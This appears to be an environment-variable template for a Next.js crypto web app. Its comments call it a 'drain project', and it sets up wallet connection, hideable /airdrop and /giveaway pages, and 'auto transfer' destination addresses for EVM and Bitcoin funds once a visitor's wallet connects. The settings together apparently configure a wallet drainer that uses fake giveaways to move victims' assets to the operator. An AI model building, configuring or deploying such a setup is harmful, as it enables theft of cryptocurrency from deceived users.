# Copy to .env.local and fill in values. Restart dev server after changing.
# Get Project ID: https://dashboard.reown.com or https://cloud.walletconnect.com

# Required for wallet connect (same name as drain project)
NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID=your_project_id_here

# Public Connect Wallet, /airdrop, and /giveaway stay OFF when these are unset.
# Set to true (or 1) and rebuild to bring a surface back. No Vercel env change
# is required to keep them hidden.
# NEXT_PUBLIC_ENABLE_WALLET=true
# NEXT_PUBLIC_ENABLE_AIRDROP=true
# NEXT_PUBLIC_ENABLE_GIVEAWAY=true

# Optional: auto transfer destination when wallet connects (EVM chains)
# NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS=0xYourAddress

# Optional: Bitcoin destination address for Bitcoin aggregator
# NEXT_PUBLIC_BITCOIN_DESTINATION_ADDRESS=bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

# Bitcoin API provider (Alchemy)
# Get your API key at: https://dashboard.alchemy.com
ALCHEMY_API_KEY=your_alchemy_api_key_here

# Admin authentication
# Generate a secure random string (at least 32 characters)
ADMIN_JWT_SECRET=your_secure_random_string_at_least_32_chars
